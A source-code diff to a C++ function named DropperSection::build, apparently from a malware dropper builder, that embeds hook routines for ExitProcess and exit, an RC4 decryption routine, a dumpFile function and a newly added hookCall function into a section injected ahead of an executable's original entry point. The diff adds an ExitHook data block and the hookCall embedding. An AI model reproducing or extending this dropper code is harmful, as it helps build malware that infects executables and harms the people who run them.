@@ -65,6 +65,7 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	// ExitProcess index
 	header->exitProcessIndex = _exitProcessIndex;
 	header->exitIndex = _exitIndex;
+	header->_exitIndex = _exitIndex;
 	
 	// Strings offsets
 	header->stringsOffsets.offset = ptr - _data;
@@ -156,19 +157,21 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
 	
 	// ExitProcessHook data
-	// DWORD offsetToExitProcessHookData = ptr - _data;
-	// memcpy(ptr, &offsetToExitProcessHookData, sizeof(DWORD));
 	*((DWORD*) ptr) = ptr - _data;
 	ptr += sizeof(DWORD);
-	
-	// END marker
 	memcpy(ptr, "<E>\0", 4);
 	ptr += 4;	
 	
 	// ExitProcessHook code
 	ptr += _embedFunction((PVOID)ExitProcessHook, (PVOID)ExitProcessHook_End, header->functions.exitProcessHook, ptr);
 	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
-
+	
+	// ExitHook data
+	*((DWORD*) ptr) = ptr - _data;
+	ptr += sizeof(DWORD);
+	memcpy(ptr, "<E>\0", 4);
+	ptr += 4;	
+	
 	// ExitHook code
 	ptr += _embedFunction((PVOID)ExitHook, (PVOID)ExitHook_End, header->functions.exitHook, ptr);
 	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
@@ -176,6 +179,10 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 	// RC4 code
 	ptr += _embedFunction((PVOID)rc4_skip, (PVOID)rc4_skip_End, header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
+	
+	// hookCall code
+	ptr += _embedFunction((PVOID)hookCall, (PVOID)hookCall_End, header->functions.hookCall, ptr);
+	cout << "hookCall is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
 	
 	// compute total size
 	size_t virtualSize = ptr - _data;
